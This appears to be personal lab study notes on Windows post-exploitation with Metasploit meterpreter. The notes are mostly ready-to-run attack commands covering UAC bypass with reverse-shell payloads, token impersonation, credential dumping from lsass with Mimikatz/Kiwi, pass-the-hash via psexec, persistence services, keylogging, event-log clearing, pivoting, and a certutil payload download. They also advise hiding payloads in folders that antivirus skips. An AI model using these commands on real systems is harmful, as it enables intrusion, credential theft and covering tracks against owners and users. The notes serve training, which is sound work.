Windows executables are stored in `/usr/share/windows-binaries`

# Enumerations

- User privileges
- Logged on users
- VM check
- Installed programs
- AV's
- Computers connected to domain
- Installed patches
- Shares

**Shell**
```shell
hostname
systeminfo
net user [user]
whoami /priv
```

Windows meterpreter commands:
```
sysinfo
getsystem
hashdump
show_mount
ps
```

After `migrate` to a higher process (like explorer.exe) previously unavailable command like f.e. `hashdump` is accessible.

`search migrate` -> possible if classic migrate fails?
`search win_privs` -> enumeration of user privileges ->
- Is System - possible AV (fe. token impersonation)
- Is In Local Admin Group
- UAC Enabled - possible AV

`search enum_logged_on` -> currently/recent logged on users
`search checkvm` -> breaking out of VM (advanced technique)
`search enum_app` -> important enum of installed software (and version) that can be exploited

**loot** - all of the stored enums

Exclusion of Anti-Virus folders that are not scanned:
`search type:post platform:windows enum_av` -> potential dir's to store the code/payloads

`search enum_computers` -> check if it's part of a domain
`search enum_patches` -> important hot fix patches to check for possible vulnerability, might need to migrate to other process, if the enum is not working: `shell, systeminfo`
`search enum_shares` -> sharing of resources via smb

# Bypassing UAC

This technique exists in all of the versions of windows, it's very effective and doesn't require many tinkering. MSF offers many UAC bypass possibilities

shell within meterpreter:
`net user`
`net localgroup administrators`

`search bypassuac` -> it's important to set the right architecture (x64?) for payload:
`set payload windows/x64/meterpreter/reverse_tcp`
`set target` -> again set correct architecture
and run

`get system` ... `hashdump` etc.

This technique works very well for Vista+

# Token impersonation with Incognito module

Access token - temporary key, cookie in a windows system generated by winlogon.exe and attached to userini.exe, all child processes inherit a copy of the access token from the creator and gain privileges. It separates processes according to security levels:
- impersonate-level: non-interactive login
- delegate-level: via standard login or RDP login -> can be used to impersonate on any system
Following privileges are required:
- SeAssignPrimaryToken
- SeCreateToken
- SeImpersonatePrivilege

`getprivs` -> check for privileges
`load_incognito` (in meterpreter session)
`list_tokens -u` -> displays **which tokens are available** and copy one of them to:
`impersonate_token <token>` (ATTACKDEFENSE\Administrator)

The process meterpreter is running in is still not privileged so `migrate` to elevated process is necessary to get `hashdump`

# Dumping hashes with Mimikatz

**SAM** - database and database file that stores passwords. Mimikatz has executable while Kiwi extension for MSF is in-memory.

`load_kiwi`
`getsystem`
`pgrep lsass` (x64 process that manages SAM)
`migrate` to lsass pid

Dumping of the passwords after gaining elevated privs:
`creds_all`
`lsa_dump_sam`
`lsa_dump_secrets`

# Pass-The-Hash with PsExec, exploiting SMB

Having hashes from `hashdump` we can login with:

`seach psexec` exploit/windows/smb/psexec
`set payload` windows/x64/meterpreter/reverse_tcp (64bit system)

In `options` we need to set SMBUser as Administrator and SMBPass as `hash:hash`

Voila, access gained!


# Establishing Persistence on Windows

- Creating a service that guarantees access after changing of creds.
We need administrative access first.

`search` platform:windows persistence -> persistence_service module
set payload for 32bit  .. windows/meterpreter/reverse_tcp

Persistence is activated throughout restarts. We just need a multi/handler and set the same payload, and run to get connection

# Enabling RDP (desktop)

TCP Port 3389
This is control protocol with visual GUI only on that port.

`search enable_rdp` 

in shell to change password:
`net user administrator hacker_123321`

`xfreerdp /u:administrator /p:hacker_123321 /v:<IPaddress>`

It is recommended to create another user account that is added to Administrative Group!

# Keylogging

Migrate to explorer.exe process!
`pgrep explorer.exe ... migrate ...`
`keyscan_start, keyscan_dump, keyscan_stop`

# Windows Event Logs Cleanup

**Event Viewer** -> Windows Logs -> Security
In meterpreter:
`clearev` - and it's done!

# Pivoting MSF

important is **autoroute**

After getting initial foothold at first system: `ipconfig` to find subnet which needs to be added: `run autoroute -s 10.2.13.0/20`

`search portscan`
`use auxiliary/scanner/portscan/tcp` -> scan ports 1-100 on victim2 machine.
Now, I know that port 80 is open, so lets forward: Port 1234 -> 80 -> victim2

```
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

Now `db_nmap -sV -sS -p 1234 localhost` displays port 80 on target machine. This means that I can use the exploit (badblue).
`set payload windows/meterpreter/bind_tcp` 
`set RHOSTS victim2`
`set LPORT 4333`
`run`

# Downloading

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d93a228b40734144bfc2c6de0441197b262b10e5/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md#L103

```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
```

# Mimikatz

https://github.com/ParrotSec/mimikatz
